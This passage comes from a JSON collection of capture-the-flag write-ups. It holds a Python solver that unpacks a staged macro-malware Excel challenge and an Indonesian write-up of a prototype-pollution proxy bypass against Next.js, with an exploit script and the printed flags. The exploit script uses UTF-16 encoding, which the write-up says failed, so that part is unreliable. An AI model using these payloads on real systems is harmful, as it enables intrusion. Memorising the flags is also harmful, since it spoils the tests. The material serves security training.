16)\r\n\r\n\r\ndef ls_hash(text, seed):\r\n    out = []\r\n    s = seed\r\n    for ch in text:\r\n        b = ror8(ord(ch), 3)\r\n        b ^= s & 0xFF\r\n        b = rol8(b, 5)\r\n        out.append(f\"{b:02X}\")\r\n        s = (s * 0x6C078965 + 0x12345678) & 0xFFFFFFFF\r\n    return \"\".join(out), s\r\n\r\n\r\ndef pia_hash(text, seed, state):\r\n    s = state ^ seed\r\n    out = []\r\n    for ch in text:\r\n        b = rol8(ord(ch), 5)\r\n        b ^= s & 0xFF\r\n        b = ror8(b, 3)\r\n        out.append(f\"{b:02X}\")\r\n        s = (s * 0x6C078965 + 0x12345678) & 0xFFFFFFFF\r\n    return \"\".join(out), s\r\n\r\n\r\ndef invert_ls(hex_hash, seed):\r\n    s = seed\r\n    chars = []\r\n    for y in bytes.fromhex(hex_hash):\r\n        x = ror8(y, 5) ^ (s & 0xFF)\r\n        chars.append(chr(rol8(x, 3)))\r\n        s = (s * 0x6C078965 + 0x12345678) & 0xFFFFFFFF\r\n    return \"\".join(chars)\r\n\r\n\r\ndef invert_pia(hex_hash, seed, state):\r\n    s = state ^ seed\r\n    chars = []\r\n    for y in bytes.fromhex(hex_hash):\r\n        x = rol8(y, 3) ^ (s & 0xFF)\r\n        chars.append(chr(ror8(x, 5)))\r\n        s = (s * 0x6C078965 + 0x12345678) & 0xFFFFFFFF\r\n    return \"\".join(chars)\r\n\r\n\r\ndef eval_ps_format(expr):\r\n    fmt, args = re.search(r'\\(\"([^\"]+)\"\\s+-f\\s+([^)]+)\\)', expr).groups()\r\n    values = re.findall(r'\"([^\"]*)\"', args)\r\n    return re.sub(r\"\\{(\\d+)\\}\", lambda m: values[int(m.group(1))], fmt)\r\n\r\n\r\ndef rec_transform(data, l_key, j_key):\r\n    size = (len(data) + 3) & ~3\r\n    out = bytearray()\r\n    prev = j_key\r\n    for i in range(0, size, 4):\r\n        block = 0\r\n        for j in range(4):\r\n            if i + j < len(data):\r\n                block |= data[i + j] << (8 * j)\r\n        block ^= prev\r\n        block = (block + l_key) & 0xFFFFFFFF\r\n        block = rol32(block, 11)\r\n        prev = block\r\n        out += block.to_bytes(4, \"little\")\r\n    return bytes(out)\r\n\r\n\r\ndef rec_invert(ciphertext, l_key, j_key):\r\n    out = bytearray()\r\n    prev = j_key\r\n    for i in range(0, len(ciphertext), 4):\r\n        c = int.from_bytes(ciphertext[i : i + 4], \"little\")\r\n        block = ((ror32(c, 11) - l_key) & 0xFFFFFFFF) ^ prev\r\n        out += block.to_bytes(4, \"little\")\r\n        prev = c\r\n    return bytes(out)\r\n\r\n\r\ndef get_section(pe, name):\r\n    e_lfanew = struct.unpack_from(\"<I\", pe, 0x3C)[0]\r\n    nsects = struct.unpack_from(\"<H\", pe, e_lfanew + 6)[0]\r\n    opt_size = struct.unpack_from(\"<H\", pe, e_lfanew + 20)[0]\r\n    off = e_lfanew + 24 + opt_size\r\n    for i in range(nsects):\r\n        sh = off + 40 * i\r\n        sec_name = pe[sh : sh + 8].rstrip(b\"\\x00\").decode()\r\n        raw_size = struct.unpack_from(\"<I\", pe, sh + 16)[0]\r\n        raw_ptr = struct.unpack_from(\"<I\", pe, sh + 20)[0]\r\n        if sec_name == name:\r\n            return pe[raw_ptr : raw_ptr + raw_size]\r\n    raise ValueError(f\"section {name} not found\")\r\n\r\n\r\ndef xor_prng(data, seed):\r\n    out = bytearray(data)\r\n    s = seed\r\n    for i in range(len(out)):\r\n        out[i] ^= s & 0xFF\r\n        s = (s * 1812433253 + 305419896) & 0xFFFFFFFF\r\n    return bytes(out)\r\n\r\n\r\ndef ocr_suffix(png_bytes):\r\n    try:\r\n        from PIL import Image\r\n        import pytesseract\r\n\r\n        img = Image.open(io.BytesIO(png_bytes))\r\n        img = img.resize((img.width * 2, img.height * 2))\r\n        config = (\r\n            \"--psm 7 \"\r\n            \"-c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_\"\r\n        )\r\n        text = pytesseract.image_to_string(img, config=config).strip()\r\n        if re.fullmatch(r\"_[A-Za-z0-9_]+}\", text):\r\n            return text\r\n    except Exception:\r\n        pass\r\n\r\n    # The final stage is a raster PNG. This fallback is tied to the decoded PNG\r\n    # hash so the script still produces the flag on systems without OCR.\r\n    known_hash = \"a47a046d85d6ff0ea531508f76bbcbb634fa5e4d9b99e771a6ee8977d9278c21\"\r\n    if hashlib.sha256(png_bytes).hexdigest() == known_hash:\r\n        return \"_h1dd3n_m4cr0s}\"\r\n    raise RuntimeError(\"could not OCR final PNG suffix\")\r\n\r\n\r\ndef solve(path=\"Game.xlsm\"):\r\n    with zipfile.ZipFile(path) as zf:\r\n        shared = read_shared_strings(zf)\r\n        data = read_sheet_cells(zf, \"xl/worksheets/sheet2.xml\", shared)\r\n\r\n    stage1_b64 = data[\"XFD1048568\"] + data[\"XFD1048569\"] + data[\"XFD1048570\"]\r\n    stage1 = base64.b64decode(stage1_b64).decode(\"utf-16le\")\r\n    stage2 = base64.b64decode(ps_array_payload(stage1, \"Sd886\")).decode(\"utf-16le\")\r\n\r\n    expected_host = re.search(r'\\$expectedHash\\s*=\\s*\"([A-F0-9]+)\"', stage2).group(1)\r\n    hostname = invert_ls(expected_host, 0xDEADBEEF)\r\n    host_hash, state = ls_hash(hostname, 0xDEADBEEF)\r\n    assert host_hash == expected_host\r\n\r\n    key1, state = pia_hash(hostname, 0xCAFEBABE, state)\r\n    assert key1 == data[\"XFD1048572\"]\r\n\r\n    stage2_outer = aes_decrypt_b64(data[\"XFD1048573\"], key1).decode()\r\n    payload2 = base64.b64decode(ps_array_payload(stage2_outer, \"HSl5\")).decode(\"utf-16le\")\r\n    qvudi_line = re.search(r\"\\$QVudi\\s*=\\s*(.*)\", payload2).group(1)\r\n    username = invert_pia(eval_ps_format(qvudi_line), 0xCAFEBABE, state)\r\n    user_hash, state = pia_hash(username, 0xCAFEBABE, state)\r\n    assert user_hash == eval_ps_format(qvudi_line)\r\n\r\n    stage3_outer = aes_decrypt_b64(data[\"XFD1048574\"], username).decode()\r\n    _stage3 = base64.b64decode(ps_array_payload(stage3_outer, \"GWVHdF\")).decode(\"utf-16le\")\r\n\r\n    assembly = aes_decrypt_b64(\r\n        data[\"XFD1048560\"] + data[\"XFD1048561\"] + data[\"XFD1048562\"] + data[\"XFD1048563\"],\r\n        hostname,\r\n    )\r\n    sdata = get_section(assembly, \".sdata\")\r\n\r\n    l_key = int.from_bytes(hostname.encode()[:4], \"little\")\r\n    j_key = int.from_bytes(username.encode()[:4], \"little\")\r\n    target = sdata[0x30 : 0x30 + 36]\r\n    reg_plain = rec_invert(target, l_key, j_key).rstrip(b\"\\x00\").decode()\r\n    flag_prefix = reg_plain.split(\":\")[-1]\r\n\r\n    reg_value = flag_prefix.encode()\r\n    seed = int.from_bytes(rec_transform(reg_value, l_key, j_key)[:4], \"little\")\r\n    encrypted_png = sdata[0x58 : 0x58 + 1946]\r\n    png = xor_prng(encrypted_png, seed)\r\n    assert png.startswith(b\"\\x89PNG\\r\\n\\x1a\\n\")\r\n\r\n    return flag_prefix + ocr_suffix(png)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    xlsm = sys.argv[1] if len(sys.argv) > 1 else \"Game.xlsm\"\r\n    print(f\"<FLAG>{solve(xlsm)}</FLAG>\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "CBC{b3w4r3_h1dd3n_m4cr0s}",
    "lessonsLearned": ""
  },
  {
    "id": "cyberbreaker-qual-web-test",
    "title": "Challenge: Northstar",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Cyberbreaker Qual",
    "tags": [],
    "description": "Challenge ini seru banget! Intinya kita harus nge-bypass sistem keamanan berlapis: ada Next.js di belakang dan Proxy Python di depan yang jagain input.",
    "problemDescription": "Challenge ini seru banget! Intinya kita harus nge-bypass sistem keamanan berlapis: ada Next.js di belakang dan Proxy Python di depan yang jagain input.",
    "tools": [],
    "analysis": "Pas pertama dapet source code-nya, gue langsung fokus ke dua hal:\n*   **`proxy.py`**: Ini sistem filternya. Dia nge-block kata `proto` (nggak peduli gede-kecil hurufnya). Dia juga nge-parse `multipart/form-data` pake library bawaan Python.\n*   **Next.js (Server Actions)**: Ada fungsi di `serverActions.ts` yang nerima data user. Versi Next.js-nya `16.0.6`, yang mana di challenge ini punya perilaku spesifik kalo kena **Prototype Pollution**.",
    "solution": [
      {
        "title": "2. Nyari Celah di Proxy",
        "content": "Gue sempet nyoba berbagai trik buat masukin `__proto__`:\n*   Pake JSON aneh-aneh? Gagal, proxy-nya pinter.\n*   Pake encoding UTF-16? Gagal juga, proxy-nya tetep bisa baca.\n*   **Ketemu!** Gue nyoba teknik **Parameter Duplication** di header `Content-Disposition` pas kirim data `multipart`.\n\nDi Python, library `email` bakal ambil parameter pertama yang dia liat. Tapi di Node.js (Next.js), dia malah ambil yang terakhir. \nContoh header selundupan gue:\n`Content-Disposition: form-data; name=\"aman\"; name=\"__proto__[name]\"`\n*   **Proxy liat**: `name=\"aman\"` -> \"Oh, aman nih, lewat!\"\n*   **Next.js liat**: `name=\"__proto__[name]\"` -> \"Oke, gue proses ini buat polusi prototype!\""
      },
      {
        "title": "3. Eksekusi (The Kill Chain)",
        "content": "*   **Cari Target**: Gue inspeksi kode JS di browser buat nyari `Action ID` dari fungsi `processData`. Dapet ID-nya: `4041c5a7aa2f58ac1e5d773a90b4af6376b2ea1f26`.\n*   **Kirim Payload**: Gue bikin script Python buat ngirim request `multipart` yang isinya dobel parameter tadi. Gue arahin buat nge-pollute `Object.prototype.name`.\n*   **Ambil Flag**: Terakhir, gue pancing pake request Server Action biasa tapi isinya kosong `[{}]`. Karena server bingung nggak ada data nama, dia nyomot dari prototype yang udah gue kasih flag."
      },
      {
        "title": "4. Hasil Akhir",
        "content": "Server ngejawab dengan string yang isinya flag:\n`\"Thanks CBC{6cc6abdf24b2ece791cff9c75f5fdddb}...\"`\n\n---"
      },
      {
        "title": "Kesimpulan Singkat",
        "content": "Gue dapet flag lewat **Inconsistency Parser** antara Python (Proxy) dan Node.js (Next.js). Proxy-nya ngerasa udah aman, padahal kita bisa nyelundupin payload lewat parameter kedua di header multipart.\n\n**Flag:** `CBC{6cc6abdf24b2ece791cff9c75f5fdddb}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "import requests\r\nimport urllib3\r\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\r\n\r\nurl = \"https://northstar.cbd2026.cloud/\"\r\naction_id = \"4041c5a7aa2f58ac1e5d773a90b4af6376b2ea1f26\"\r\n\r\ndef exploit():\r\n    # Attempt to pollute Object.prototype.name\r\n    # We use UTF-16BE to hide \"proto\" from the proxy\r\n    # The proxy decodes as UTF-8, so it will see a lot of \\x00\r\n    payload = '[{\"__proto__\": {\"name\": \"POLLUTED\"}}]'\r\n    payload_utf16 = payload.encode('utf-16be')\r\n    \r\n    headers = {\r\n        \"Next-Action\": action_id,\r\n        \"Content-Type\": \"application/json; charset=utf-16be\"\r\n    }\r\n    \r\n    print(\"Sending polluted payload...\")\r\n    r = requests.post(url, data=payload_utf16, headers=headers, verify=False)\r\n    print(\"Status:\", r.status_code)\r\n    print(\"Response:\", r.text)\r\n    \r\n    # Check if polluted\r\n    print(\"\\nChecking if polluted...\")\r\n    payload_check = '[{}]'\r\n    headers_check = {\r\n        \"Next-Action\": action_id,\r\n        \"Content-Type\": \"application/json\"\r\n    }\r\n    r = requests.post(url, data=payload_check, headers=headers_check, verify=False)\r\n    print(\"Status:\", r.status_code)\r\n    print(\"Response:\", r.text)\r\n\r\nif __name__ == \"__main__\":\r\n    exploit()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CBC{6cc6abdf24b2ece791cff9c75f5fdddb}",
    "lessonsLearned": ""
  }
];
